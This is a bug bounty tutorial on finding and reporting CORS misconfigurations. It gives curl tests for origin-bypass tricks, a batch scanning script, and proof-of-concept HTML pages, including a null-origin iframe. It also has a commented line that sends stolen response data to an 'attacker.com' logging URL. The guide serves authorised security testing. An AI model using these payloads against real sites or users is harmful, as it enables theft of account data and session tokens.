CORS misconfigurations remain one of the most consistently rewarded vulnerability classes in bug bounty programs. They are everywhere, they are often high-severity, and most hunters either test for them incorrectly or miss them entirely. This guide covers the exact methodology — from first request to final report — that turns CORS testing from guesswork into a repeatable process.

Section 01What Is CORS and Why Does It Matter for Security?

Cross-Origin Resource Sharing (CORS) is a browser mechanism that allows a web server to indicate which origins (domains, schemes, or ports) other than its own are permitted to read its responses. Without CORS, the browser's Same-Origin Policy (SOP) would block all cross-origin reads by default.

Here is the problem: when a server dynamically reflects the requesting origin in its Access-Control-Allow-Origin (ACAO) header — especially alongside Access-Control-Allow-Credentials: true — it effectively disables the Same-Origin Policy for any origin that asks. An attacker hosting a malicious page can make authenticated requests to the vulnerable API and read the response, stealing user data, tokens, or session information.

The core headers you need to understand:

  • Access-Control-Allow-Origin (ACAO) — tells the browser which origin is allowed to read the response
  • Access-Control-Allow-Credentials (ACAC) — when true, the browser sends cookies/auth headers with the cross-origin request
  • Access-Control-Allow-Methods — which HTTP methods are permitted
  • Access-Control-Allow-Headers — which custom headers the client can send
Pro Tip: Why CORS bugs pay well

A CORS misconfiguration on an authenticated API endpoint is functionally equivalent to a stored XSS in terms of impact — it gives an attacker full read access to a victim's data. Triagers and companies understand this, which is why well-written CORS reports consistently earn medium-to-high payouts.

Section 02The 7 CORS Bypass Vectors Every Hunter Should Test

Most applications do not blindly reflect any origin. Instead, they implement validation logic — an allowlist, a regex, or a prefix/suffix check. Each of these can be bypassed in specific ways. Here are the seven vectors you should test on every target.

1. Arbitrary Origin Reflection

The simplest and most severe case. The server reflects whatever value you send in the Origin header directly into the ACAO response header, without any validation.

Test: Arbitrary Origin Reflectioncurl -s -I -H "Origin: https://evil.com" \ https://api.example.com/v1/user/profile # Look for: # Access-Control-Allow-Origin: https://evil.com # Access-Control-Allow-Credentials: true

If the server returns your attacker-controlled origin along with credentials allowed, this is a critical finding. Any authenticated endpoint becomes exploitable.

2. Null Origin

Some applications whitelist the special null origin. This is dangerous because an attacker can trigger a null origin from a sandboxed iframe, a data: URI, or a local file — all common attack scenarios.

Test: Null Origincurl -s -I -H "Origin: null" \ https://api.example.com/v1/user/profile # Look for: # Access-Control-Allow-Origin: null # Access-Control-Allow-Credentials: true
Common mistake: many hunters skip null origin testing

The null origin bypass is easy to miss because it does not look like a "real" origin. But it is one of the most exploitable vectors — sandboxed iframes reliably produce a null origin in all modern browsers.

3. HTTP Downgrade (Scheme Bypass)

If the target is HTTPS, test whether the CORS validation accepts the HTTP version of a trusted origin. Many regex patterns check the domain but not the scheme.

Test: HTTP Downgradecurl -s -I -H "Origin: http://trusted.example.com" \ https://api.example.com/v1/user/profile # If the app trusts https://trusted.example.com # but also accepts http://trusted.example.com # → MitM on the trusted domain = CORS bypass

This is exploitable in any scenario where the attacker has network position (public WiFi, ISP-level interception, compromised router). The attacker MitMs the HTTP origin to serve the malicious JavaScript.

4. Subdomain Wildcard / Spoofing

When a server trusts all subdomains (e.g., *.example.com), any XSS on any subdomain becomes a full CORS bypass. Test whether arbitrary subdomains are accepted:

Test: Subdomain Wildcardcurl -s -I -H "Origin: https://evil.example.com" \ https://api.example.com/v1/user/profile # Also try deep subdomains: curl -s -I -H "Origin: https://anything.subdomain.example.com" \ https://api.example.com/v1/user/profile
Pro Tip: Chain with subdomain takeover

If you find a CORS policy that trusts all subdomains AND you find a dangling DNS record (subdomain takeover), the two chain into a high-severity exploit. The takeover gives you control of a "trusted" origin.

5. Prefix Match Bypass

Some validation logic checks whether the origin starts with a trusted domain. This can be bypassed by registering a domain that begins with the trusted domain string:

Test: Prefix Match# If the server trusts origins starting with "example.com" curl -s -I -H "Origin: https://example.com.evil.com" \ https://api.example.com/v1/user/profile # The server sees "example.com" at the start and allows it # But the actual domain is evil.com

6. Suffix Match Bypass

The inverse of prefix matching. The server checks if the origin ends with a trusted domain. An attacker registers a domain ending in the same string:

Test: Suffix Match# If the server trusts origins ending in "example.com" curl -s -I -H "Origin: https://notexample.com" \ https://api.example.com/v1/user/profile # Or with a hyphen trick: curl -s -I -H "Origin: https://evil-example.com" \ https://api.example.com/v1/user/profile

7. Backtick / Special Character Bypass

Some origin validation fails when encountering special characters. The backtick (`) is notable because certain server-side parsers truncate or mishandle it, causing the validation to pass on a crafted origin:

Test: Backtick Bypasscurl -s -I -H "Origin: https://example.com%60.evil.com" \ https://api.example.com/v1/user/profile # Also try other special characters: curl -s -I -H "Origin: https://example.com'.evil.com" \ https://api.example.com/v1/user/profile curl -s -I -H "Origin: https://example.com!.evil.com" \ https://api.example.com/v1/user/profile
Browser compatibility matters

Not all special character bypasses work in every browser. Always verify your PoC in Chrome, Firefox, and Safari. A bypass that only works in curl but not in a real browser is not exploitable and will be marked as informational or N/A.

Section 03Wildcard vs Reflected: Why Severity Matters

This is the single most important distinction in CORS testing, and the one that trips up more hunters than anything else. Not all CORS "misconfigurations" are equal.

Scenario A: ACAO: * (Wildcard)

When a server returns Access-Control-Allow-Origin: *, it allows any origin to read the response. Sounds bad, right? Here is the catch: browsers will not send credentials (cookies, auth headers) with a wildcard ACAO. The browser enforces that ACAO: * and ACAC: true cannot coexist — the request will fail.

This means a wildcard CORS configuration is only exploitable if the endpoint returns sensitive data without requiring authentication (e.g., internal API endpoints that rely on network-level access control instead of auth tokens). In most bug bounty contexts, this is medium severity at best and often informational.

Scenario B: Reflected Origin + Credentials

When a server reflects the exact Origin header value into the ACAO and sets ACAC: true, the browser will send cookies. This means an attacker's malicious page can make an authenticated request and read the full response — account data, tokens, PII, everything.

This is high severity. It is functionally equivalent to cross-site data theft.

Pro Tip: How to explain this in reports

When you find a reflected origin + credentials case, frame your impact section around what specific data the attacker can steal. "This endpoint returns the user's email, full name, billing address, and API keys" hits much harder than "CORS misconfiguration allows cross-origin reads." Be specific.

Do not report ACAO: * alone as high severity

Submitting a wildcard ACAO finding as a high/critical bug is one of the fastest ways to get marked as "not applicable" and damage your reputation with a program. Always check whether credentials are sent and whether the data returned requires authentication.

Quick Severity Reference

CORS Severity Cheat SheetACAO: * + No credentials = Low/Info (unless sensitive unauthenticated data) ACAO: * + ACAC: true = Browser blocks it (not exploitable) ACAO: [reflected origin] + No credentials = Low (no auth = limited impact) ACAO: [reflected origin] + ACAC: true = High/Critical (full authenticated data theft) ACAO: null + ACAC: true = High (exploitable via sandboxed iframe)

Section 04Building a One-Liner Scanner (curl Examples)

Before automating, you need to understand what each test looks like as a single request. Here is a complete curl-based testing methodology. All examples target fictional endpoints — replace with your actual in-scope target.

The Complete Test Suite

Bash: Full CORS Test Suite#!/bin/bash # CORS Misconfiguration Test Suite # Replace TARGET with your in-scope endpoint TARGET="https://api.example.com/v1/user/profile" echo "[*] Testing arbitrary origin reflection..." curl -s -I -H "Origin: https://evil.com" "$TARGET" | grep -i "access-control" echo "[*] Testing null origin..." curl -s -I -H "Origin: null" "$TARGET" | grep -i "access-control" echo "[*] Testing HTTP downgrade..." curl -s -I -H "Origin: http://example.com" "$TARGET" | grep -i "access-control" echo "[*] Testing subdomain wildcard..." curl -s -I -H "Origin: https://evil.example.com" "$TARGET" | grep -i "access-control" echo "[*] Testing prefix bypass..." curl -s -I -H "Origin: https://example.com.evil.com" "$TARGET" | grep -i "access-control" echo "[*] Testing suffix bypass..." curl -s -I -H "Origin: https://notexample.com" "$TARGET" | grep -i "access-control" echo "[*] Testing backtick bypass..." curl -s -I -H "Origin: https://example.com%60.evil.com" "$TARGET" | grep -i "access-control" echo "[*] Done."

Interpreting Results

For each test, look at the full set of CORS headers returned:

  • If Access-Control-Allow-Origin matches your injected origin AND Access-Control-Allow-Credentials: true is present — you have a finding.
  • If ACAO matches but ACAC is absent or false — check whether the endpoint returns anything useful without auth. If not, it is likely informational.
  • If ACAO is always * regardless of what you send — test whether unauthenticated data is sensitive. If it is just public data, move on.
Pro Tip: Use -v instead of -I for full context

The -I flag sends a HEAD request, which some servers handle differently from GET. If you get no CORS headers with -I, try curl -s -v -H "Origin: ..." URL 2>&1 | grep -i "access-control" to see the full response on a GET request.

Section 05Automating at Scale

Manual testing is essential for understanding, but real-world bug bounty hunting requires testing hundreds or thousands of endpoints. Here is how to build a lightweight pipeline.

Step 1: Subdomain Enumeration

Bash: Recon Pipeline# Gather subdomains using multiple sources subfinder -d example.com -silent | sort -u > subs.txt # Probe for live HTTP services cat subs.txt | httpx -silent -status-code -title -tech-detect > live_hosts.txt # Extract just the URLs cat subs.txt | httpx -silent > urls.txt echo "[*] Found $(wc -l < urls.txt) live hosts"

Step 2: Batch CORS Testing

Bash: Batch CORS Scanner#!/bin/bash # cors_scan.sh — batch test CORS across a list of URLs INPUT="urls.txt" OUTPUT="cors_results.txt" ORIGIN="https://evil.com" echo "[*] Testing $(wc -l < $INPUT) URLs for CORS misconfig..." > "$OUTPUT" while IFS= read -r url; do response=$(curl -s -D - -H "Origin: $ORIGIN" "$url" -o /dev/null --max-time 10 2>/dev/null) acao=$(echo "$response" | grep -i "access-control-allow-origin" | tr -d '\r') acac=$(echo "$response" | grep -i "access-control-allow-credentials" | tr -d '\r') if echo "$acao" | grep -qi "$ORIGIN"; then echo "[VULN] $url | $acao | $acac" | tee -a "$OUTPUT" elif echo "$acao" | grep -qi "null"; then echo "[NULL] $url | $acao | $acac" | tee -a "$OUTPUT" fi done < "$INPUT" echo "[*] Results saved to $OUTPUT"

Step 3: Rate Limiting Etiquette

Responsible testing is not optional — it is a requirement for continued access to bug bounty programs.

  • Respect rate limits. Add a sleep (0.5 to 2 seconds) between requests. Use sleep 1 in your loop or configure your tool's concurrency.
  • Check scope carefully. Only test domains and endpoints explicitly listed in the program's scope. Wildcard scopes (e.g., *.example.com) still have exclusions — read the rules.
  • Use a custom User-Agent. Include your HackerOne/Bugcrowd username so the target can identify your traffic: -H "User-Agent: BugBountyHunter-YourUsername"
  • Test during off-peak hours when possible, especially for smaller targets.
  • Stop immediately if you notice errors, 429 responses, or signs of WAF blocking.
Automation without rate limiting can get you banned

Programs will ban you permanently if your scanner hammers their infrastructure. One CORS finding is worth more than zero findings plus a lifetime ban. Be patient.

Section 06Writing a High-Quality Report

The difference between a report that earns a bounty and one that gets closed as "informational" often has nothing to do with the bug itself — it is about how you present it. Here is what triagers look for.

Report Structure

  1. Title — Clear, specific, includes the affected endpoint. Example: "CORS misconfiguration on api.example.com/v1/user allows arbitrary origin with credentials"
  2. Severity — Be honest. Use the CVSS calculator. Do not inflate.
  3. Description — What is the vulnerability, in one paragraph.
  4. Steps to Reproduce — Exact curl commands that demonstrate the issue.
  5. Proof of Concept — A working HTML page that proves exploitation.
  6. Impact — What specific data can the attacker steal? Be concrete.
  7. Remediation — Brief suggestions for fixing the issue.

Proof of Concept Template

HTML: CORS PoC Template<!DOCTYPE html> <html> <head><title>CORS PoC</title></head> <body> <h1>CORS Misconfiguration PoC</h1> <p>If vulnerable, the user's data will appear below:</p> <pre id="result">Loading...</pre> <script> fetch('https://api.example.com/v1/user/profile', { credentials: 'include' }) .then(response => response.text()) .then(data => { document.getElementById('result').textContent = data; // In a real attack, the attacker would exfiltrate this: // new Image().src = 'https://attacker.com/log?data=' + // encodeURIComponent(data); }) .catch(err => { document.getElementById('result').textContent = 'Request failed: ' + err.message; }); </script> </body> </html>

Null Origin PoC (Sandboxed Iframe)

HTML: Null Origin PoC<!DOCTYPE html> <html> <head><title>Null Origin CORS PoC</title></head> <body> <h1>Null Origin CORS PoC</h1> <pre id="result">Loading...</pre> <iframe sandbox="allow-scripts" srcdoc=" <script> fetch('https://api.example.com/v1/user/profile', { credentials: 'include' }) .then(r => r.text()) .then(d => parent.postMessage(d, '*')); </script> "></iframe> <script> window.addEventListener('message', function(e) { document.getElementById('result').textContent = e.data; }); </script> </body> </html>

Impact Sections That Get Payouts

Weak impact statement: "An attacker could exploit this CORS misconfiguration."

Strong impact statement: "By hosting the attached PoC HTML file, an attacker can steal any authenticated user's profile data including their email address, full name, billing address, and active API keys. The attacker only needs to lure the victim to a URL they control (e.g., via phishing, social media link, or forum post). No further interaction is required."

Pro Tip: Include a sanitised response sample

Redact PII, but show the triager the exact JSON structure your PoC retrieves. If the response contains {"email": "...", "api_key": "...", "billing": {...}}, that visual proof of sensitive data is far more convincing than text descriptions alone.

Section 07Common False Positives and How to Avoid Them

CORS testing generates a lot of noise. Here are the false positives that waste your time and damage your reputation if reported.

1. CDN Wildcard Responses

Many CDNs (CloudFront, Akamai, Fastly) add Access-Control-Allow-Origin: * to all responses by default for static assets. This is by design — CSS files, images, and fonts need to load cross-origin. Unless the CDN endpoint returns authenticated user data, this is not a vulnerability.

How to verify: Check whether the endpoint requires authentication. If it returns the same data without cookies, it is public content served via CDN. Move on.

2. Pre-flight Only (No Credentials)

Some servers respond to OPTIONS pre-flight requests with permissive CORS headers but do not include Access-Control-Allow-Credentials: true. Without credentials, the browser will not send cookies — meaning the response will not contain user-specific data.

How to verify: Send a GET request with the Origin header (not just OPTIONS). Confirm that ACAC: true is present in the actual response, not just the pre-flight.

3. Internal-Only Services With No User Data

You might find a CORS misconfiguration on an internal API that returns infrastructure data (server health, version numbers, config). If this endpoint is only accessible internally and contains no user data or secrets, the impact is limited.

How to verify: Check what the endpoint actually returns. Health check endpoints like /status or /ping that return {"status": "ok"} are almost never worth reporting.

4. CORS Without Exploitable Data

A perfectly misconfigured CORS policy on an endpoint that returns zero sensitive data is not a vulnerability. The CORS misconfiguration is the mechanism — the impact comes from what data it exposes.

Before you hit "Submit" — ask these three questions

1. Does the response contain user-specific or sensitive data? 2. Does the server send ACAC: true on the actual request (not just pre-flight)? 3. Does my PoC work in a real browser, not just curl? If any answer is "no," reconsider whether this is reportable.

Section 08Real-World Impact Scenarios

To understand why CORS misconfigurations matter, here are fictional but realistic scenarios that demonstrate exploitation chains. All examples use fictional companies and domains.

Scenario 1: Cookie Theft on Shared Parent Domains

Imagine app.acmecorp.com sets a session cookie with Domain=.acmecorp.com. Their API at api.acmecorp.com trusts all *.acmecorp.com subdomains via CORS. An attacker finds an XSS on blog.acmecorp.com (a third-party WordPress installation with a plugin vulnerability).

The attack chain:

  1. Attacker exploits XSS on blog.acmecorp.com to inject JavaScript
  2. Because blog.acmecorp.com shares the parent domain cookie, the browser includes the session cookie with requests to api.acmecorp.com
  3. The CORS policy trusts blog.acmecorp.com as a valid subdomain origin
  4. The injected JS reads the API response containing the user's account data and exfiltrates it to the attacker's server

Impact: Full account data theft for any user who visits the compromised blog page. No additional user interaction required beyond the initial page visit.

Scenario 2: OAuth Token Interception

A SaaS application at dashboard.exampleapp.com uses OAuth and stores the access token in a response from auth.exampleapp.com/token. The token endpoint has a CORS misconfiguration — it reflects any origin with credentials.

The attacker hosts a page that requests auth.exampleapp.com/token with the victim's cookies. The response includes a fresh OAuth access token. The attacker now has API access equivalent to the victim's session — and the token works from any origin.

Impact: OAuth token theft allows the attacker to impersonate the victim indefinitely (until token expiry), access all connected services, and potentially pivot to other integrations.

Scenario 3: Internal API Data Exfiltration

A company exposes an internal API at internal.acmecorp.com that relies on VPN access for security instead of per-request authentication. The API returns employee directories, salary bands, and project codenames. The CORS policy is ACAO: * because "only internal users can reach it anyway."

An attacker who compromises any internal machine (phishing, malware) can serve a local HTML page that reads from the API. Because ACAO: * allows any origin and the user is on the VPN, the browser happily fetches and returns all internal data to the attacker's exfiltration endpoint.

Impact: Internal data exfiltration. This is the scenario where ACAO: * without credentials is actually dangerous — the "authentication" is network-level, and once the attacker is inside the network, the CORS policy provides zero protection.

Pro Tip: Always think in chains

The highest-paying CORS reports are rarely standalone. They chain with other weaknesses: subdomain takeover, XSS on a sibling subdomain, session misconfiguration, or network-level access assumptions. When you find a CORS misconfig, ask yourself: "What else on this attack surface could make this worse?"
